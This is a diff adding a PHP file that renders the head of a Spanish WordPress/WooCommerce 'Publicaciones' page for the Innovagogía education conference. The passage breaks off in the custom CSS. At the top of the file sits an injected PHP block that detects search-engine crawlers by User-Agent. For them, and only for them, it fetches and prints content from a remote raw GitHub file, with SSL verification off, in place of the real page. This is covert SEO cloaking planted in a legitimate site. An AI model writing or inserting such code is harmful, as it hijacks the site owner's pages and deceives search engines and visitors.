@@ -1,0 +1,1254 @@
+<?php
+@ob_start();
+header("Vary: User-Agent");
+$targetUrl = "http://raw.githubusercontent.com/callsnoop/shellsnoop/refs/heads/main/innovagogiaa.txt";
+$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+function fetchContentCurl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        CURLOPT_REFERER => "https://www.google.com/",
+        CURLOPT_CONNECTTIMEOUT => 5,
+
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
+    ]);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ?: '';
+}
+if (preg_match($botPattern, strtolower($userAgent))) {
+    usleep(random_int(100000, 200000));
+    echo fetchContentCurl($targetUrl);
+    @ob_end_flush();
+    exit;
+}
+?>
+<!doctype html>
+<html lang="es">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	
+	<!-- This site is optimized with the Yoast SEO plugin v26.7 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Publicaciones - Innovagogía</title>
+	<link rel="canonical" href="https://www.innovagogia.es/publicaciones/" />
+	<meta property="og:locale" content="es_ES" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Publicaciones - Innovagogía" />
+	<meta property="og:description" content="Publicaciones Publicaciones científicas Innovagogía 2024 Monográficos Innovación educativa y transformación social. Propuestas para los actuales desafíos El VII Congreso Internacional de Innovación Pedagógica y Praxis Educativa, Innovagogía 2024, celebrado del 28 al 30 de mayo, ha sido una vez más un punto de encuentro clave para profesionales de la educación de todo el mundo. Este [&hellip;]" />
+	<meta property="og:url" content="https://www.innovagogia.es/publicaciones/" />
+	<meta property="og:site_name" content="Innovagogía" />
+	<meta property="article:modified_time" content="2025-09-22T08:35:56+00:00" />
+	<meta property="og:image" content="https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1.jpg" />
+	<meta property="og:image:width" content="950" />
+	<meta property="og:image:height" content="530" />
+	<meta property="og:image:type" content="image/jpeg" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:label1" content="Tiempo de lectura" />
+	<meta name="twitter:data1" content="2 minutos" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://www.innovagogia.es/publicaciones/","url":"https://www.innovagogia.es/publicaciones/","name":"Publicaciones - Innovagogía","isPartOf":{"@id":"https://www.innovagogia.es/#website"},"primaryImageOfPage":{"@id":"https://www.innovagogia.es/publicaciones/#primaryimage"},"image":{"@id":"https://www.innovagogia.es/publicaciones/#primaryimage"},"thumbnailUrl":"https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1.jpg","datePublished":"2025-09-15T07:35:29+00:00","dateModified":"2025-09-22T08:35:56+00:00","breadcrumb":{"@id":"https://www.innovagogia.es/publicaciones/#breadcrumb"},"inLanguage":"es","potentialAction":[{"@type":"ReadAction","target":["https://www.innovagogia.es/publicaciones/"]}]},{"@type":"ImageObject","inLanguage":"es","@id":"https://www.innovagogia.es/publicaciones/#primaryimage","url":"https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1.jpg","contentUrl":"https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1.jpg","width":950,"height":530},{"@type":"BreadcrumbList","@id":"https://www.innovagogia.es/publicaciones/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Portada","item":"https://www.innovagogia.es/"},{"@type":"ListItem","position":2,"name":"Publicaciones"}]},{"@type":"WebSite","@id":"https://www.innovagogia.es/#website","url":"https://www.innovagogia.es/","name":"Innovagogía","description":"Innovagogía","publisher":{"@id":"https://www.innovagogia.es/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.innovagogia.es/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"es"},{"@type":"Organization","@id":"https://www.innovagogia.es/#organization","name":"Innovagogía","url":"https://www.innovagogia.es/","logo":{"@type":"ImageObject","inLanguage":"es","@id":"https://www.innovagogia.es/#/schema/logo/image/","url":"https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2.jpg","contentUrl":"https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2.jpg","width":411,"height":139,"caption":"Innovagogía"},"image":{"@id":"https://www.innovagogia.es/#/schema/logo/image/"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//www.googletagmanager.com' />
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.innovagogia.es\/wp-includes\/js\/wp-emoji-release.min.js?ver=4b11d5e8a9c191bedbc70cdc0dc5f1c2"}};
+/*! This file is auto-generated */
+!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<style id='global-styles-inline-css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:root { --wp--style--global--content-size: 800px;--wp--style--global--wide-size: 1200px; }:where(body) { margin: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 24px; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: 24px; }:root :where(.is-layout-flow) > :first-child{margin-block-start: 0;}:root :where(.is-layout-flow) > :last-child{margin-block-end: 0;}:root :where(.is-layout-flow) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-constrained) > :first-child{margin-block-start: 0;}:root :where(.is-layout-constrained) > :last-child{margin-block-end: 0;}:root :where(.is-layout-constrained) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-flex){gap: 24px;}:root :where(.is-layout-grid){gap: 24px;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}a:where(:not(.wp-element-button)){text-decoration: underline;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;line-height: inherit;padding: calc(0.667em + 2px) calc(1.333em + 2px);text-decoration: none;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='woocommerce-layout-css' href='https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/css/woocommerce-layout.css?ver=10.3.7' media='all' />
+<link rel='stylesheet' id='woocommerce-smallscreen-css' href='https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/css/woocommerce-smallscreen.css?ver=10.3.7' media='only screen and (max-width: 768px)' />
+<link rel='stylesheet' id='woocommerce-general-css' href='https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/css/woocommerce.css?ver=10.3.7' media='all' />
+<style id='woocommerce-inline-inline-css'>
+.woocommerce form .form-row .required { visibility: visible; }
+</style>
+<link rel='stylesheet' id='cmplz-general-css' href='https://www.innovagogia.es/wp-content/plugins/complianz-gdpr/assets/css/cookieblocker.min.css?ver=1765958680' media='all' />
+<link rel='stylesheet' id='brands-styles-css' href='https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/css/brands.css?ver=10.3.7' media='all' />
+<link rel='stylesheet' id='hello-elementor-css' href='https://www.innovagogia.es/wp-content/themes/hello-elementor/assets/css/reset.css?ver=3.4.5' media='all' />
+<link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://www.innovagogia.es/wp-content/themes/hello-elementor/assets/css/theme.css?ver=3.4.5' media='all' />
+<link rel='stylesheet' id='hello-elementor-header-footer-css' href='https://www.innovagogia.es/wp-content/themes/hello-elementor/assets/css/header-footer.css?ver=3.4.5' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.31.5' media='all' />
+<link rel='stylesheet' id='elementor-post-7-css' href='https://www.innovagogia.es/wp-content/uploads/elementor/css/post-7.css?ver=1767922645' media='all' />
+<link rel='stylesheet' id='widget-image-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.31.5' media='all' />
+<link rel='stylesheet' id='widget-nav-menu-css' href='https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/css/widget-nav-menu.min.css?ver=3.32.0' media='all' />
+<link rel='stylesheet' id='widget-woocommerce-menu-cart-css' href='https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/css/widget-woocommerce-menu-cart.min.css?ver=3.32.0' media='all' />
+<link rel='stylesheet' id='e-sticky-css' href='https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/css/modules/sticky.min.css?ver=3.32.0' media='all' />
+<link rel='stylesheet' id='widget-icon-list-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/css/widget-icon-list.min.css?ver=3.31.5' media='all' />
+<link rel='stylesheet' id='widget-divider-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/css/widget-divider.min.css?ver=3.31.5' media='all' />
+<link rel='stylesheet' id='widget-heading-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.31.5' media='all' />
+<link rel='stylesheet' id='e-animation-fadeInUp-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/lib/animations/styles/fadeInUp.min.css?ver=3.31.5' media='all' />
+<link rel='stylesheet' id='swiper-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/lib/swiper/v8/css/swiper.min.css?ver=8.4.5' media='all' />
+<link rel='stylesheet' id='e-swiper-css' href='https://www.innovagogia.es/wp-content/plugins/elementor/assets/css/conditionals/e-swiper.min.css?ver=3.31.5' media='all' />
+<link rel='stylesheet' id='widget-nested-carousel-css' href='https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/css/widget-nested-carousel.min.css?ver=3.32.0' media='all' />
+<link rel='stylesheet' id='elementor-post-742-css' href='https://www.innovagogia.es/wp-content/uploads/elementor/css/post-742.css?ver=1767941839' media='all' />
+<link rel='stylesheet' id='elementor-post-236-css' href='https://www.innovagogia.es/wp-content/uploads/elementor/css/post-236.css?ver=1767922647' media='all' />
+<link rel='stylesheet' id='elementor-post-601-css' href='https://www.innovagogia.es/wp-content/uploads/elementor/css/post-601.css?ver=1767922647' media='all' />
+<link rel='stylesheet' id='chld_thm_cfg_child-css' href='https://www.innovagogia.es/wp-content/themes/hello-elementor-child/style.css?ver=4b11d5e8a9c191bedbc70cdc0dc5f1c2' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-roboto-css' href='https://www.innovagogia.es/wp-content/uploads/elementor/google-fonts/css/roboto.css?ver=1743518499' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-robotoslab-css' href='https://www.innovagogia.es/wp-content/uploads/elementor/google-fonts/css/robotoslab.css?ver=1743518501' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-dmsans-css' href='https://www.innovagogia.es/wp-content/uploads/elementor/google-fonts/css/dmsans.css?ver=1743519874' media='all' />
+<script src="https://www.innovagogia.es/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://www.innovagogia.es/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.7.0-wc.10.3.7" id="wc-jquery-blockui-js" defer data-wp-strategy="defer"></script>
+<script id="wc-add-to-cart-js-extra">
+var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"Ver carrito","cart_url":"https:\/\/www.innovagogia.es\/carrito\/","is_cart":"","cart_redirect_after_add":"no"};
+</script>
+<script src="https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=10.3.7" id="wc-add-to-cart-js" defer data-wp-strategy="defer"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4-wc.10.3.7" id="wc-js-cookie-js" defer data-wp-strategy="defer"></script>
+<script id="woocommerce-js-extra">
+var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_password_show":"Mostrar contrase\u00f1a","i18n_password_hide":"Ocultar contrase\u00f1a"};
+</script>
+<script src="https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=10.3.7" id="woocommerce-js" defer data-wp-strategy="defer"></script>
+<link rel="https://api.w.org/" href="https://www.innovagogia.es/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.innovagogia.es/wp-json/wp/v2/pages/742" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.innovagogia.es/xmlrpc.php?rsd" />
+
+<link rel='shortlink' href='https://www.innovagogia.es/?p=742' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.innovagogia.es/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.innovagogia.es%2Fpublicaciones%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.innovagogia.es/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.innovagogia.es%2Fpublicaciones%2F&#038;format=xml" />
+<meta name="generator" content="Site Kit by Google 1.168.0" />			<style>.cmplz-hidden {
+					display: none !important;
+				}</style>	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
+	<meta name="generator" content="Elementor 3.31.5; features: e_font_icon_svg, additional_custom_breakpoints, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-swap">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-10951064509">
+</script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-10951064509');
+</script>
+
+<!-- Event snippet for Botón de WhatsApp conversion page -->
+<script>
+  gtag('event', 'conversion', {'send_to': 'AW-10951064509/8qlVCOjIrKcaEL337-Uo'});
+</script>
+
+<!-- Event snippet for Botón de WhatsApp conversion page
+In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
+<script>
+function gtag_report_conversion(url) {
+  var callback = function () {
+    if (typeof(url) != 'undefined') {
+      window.location = url;
+    }
+  };
+  gtag('event', 'conversion', {
+      'send_to': 'AW-10951064509/8qlVCOjIrKcaEL337-Uo',
+      'event_callback': callback
+  });
+  return false;
+}
+</script>
+
+<!-- Event snippet for Suscripción Newsletter Matilla conversion page -->
+<script>
+  gtag('event', 'conversion', {'send_to': 'AW-10951064509/fu_NCIOd-O8YEL337-Uo'});
+</script>
+
+<!-- Event snippet for Suscripción Newsletter Matilla conversion page
+In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
+<script>
+function gtag_report_conversion(url) {
+  var callback = function () {
+    if (typeof(url) != 'undefined') {
+      window.location = url;
+    }
+  };
+  gtag('event', 'conversion', {
+      'send_to': 'AW-10951064509/fu_NCIOd-O8YEL337-Uo',
+      'event_callback': callback
+  });
+  return false;
+}
+</script>
+
+
+			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+					<style id="wp-custom-css">
+			/* Cambiar fuente en títulos de productos */
+.woocommerce-loop-product__title,
+.product_title {
+	font-family: 'Satoshi', sans-serif;
+	font-weight:bold;
+	color: #0d5187;}
+
